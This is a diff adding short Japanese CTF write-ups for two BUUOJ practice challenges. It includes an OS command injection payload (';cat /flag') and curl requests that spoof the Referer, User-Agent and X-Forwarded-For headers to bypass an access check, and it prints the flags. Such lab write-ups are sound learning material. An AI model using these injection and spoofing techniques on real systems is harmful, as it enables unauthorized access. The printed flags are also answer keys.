@@ -721,3 +721,49 @@ X-Powered-By: PHP/5.3.3
 </body>
 </html>
 ```
+# [ACTF2020 新生赛]Exec
+
+OSコマンドインジェクションが使える。
+```
+;cat /flag
+```
+flag{b64ec65f-7ef7-4efe-9050-826f82b59e64}
+
+# [极客大挑战 2019]Http
+
+```html
+<h2>小组简介</h2> <p>·成立时间：2005年3月<br /><br /> ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术<br /><br /> ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>！</p>
+```
+
+ふつうにSecret.phpにアクセスすると
+```
+It doesn't come from 'https://www.Sycsecret.com'
+```
+といわれるので、refererヘッダを書き換える。
+```
+% curl -i http://node3.buuoj.cn:29595/Secret.php -H "referer: https://www.Sycsecret.com" 
+```
+
+```html
+<h1>Please use "Syclover" browser</h1>
+```
+```
+% curl -i http://node3.buuoj.cn:29595/Secret.php -H "referer: https://www.Sycsecret.com" -A Syclover
+```
+
+```html
+<h1>No!!! you can only read this locally!!!</h1>
+```
+> X-Forwarded-Forとは、HTTPヘッダフィールドの1つであり、ロードバランサなどの機器を経由してWebサーバに接続するクライアントの送信元IPアドレスを特定する際のデファクトスタンダードです。
+クライアントの送信元IPアドレスの特定は、ロードバランサなどでクライアントの送信元IPアドレスが変換された場合でも、HTTPヘッダに元のクライアントIPアドレスの情報を付加することで実現します。
+
+> HTTP リクエストがレイヤー 7 プロキシを通過すると、このパケットの送信元 IP は、クライアントの実際の IP (クライアント IP) ではなく、プロキシ IP に変更されます。 実際には、クライアント IP は HTTP ヘッドフィールドの x-forwarded-for フィールドに書き込まれます。
+
+つまり、X-Forwared-Forとは通常サーバにアクセスするまでにproxyなどを経由した場合、送信元IPアドレスが書き換えられてしまうが書き換えれるたびに今までの送信元IPアドレスをメモしておくヘッダである。
+
+これを書き換えることでlocalhostから自分のパソコンをproxyとして経由してSecret.phpにアクセスしてるように偽装することができる。多分。
+
+% curl -i http://node3.buuoj.cn:29595/Secret.php -H "referer: https://www.Sycsecret.com" -H "x-forwarded-for:localhost" -A "Syclover"
+
+flag{784392dc-e1db-411a-b5a6-989fc4a2c0d9}
+
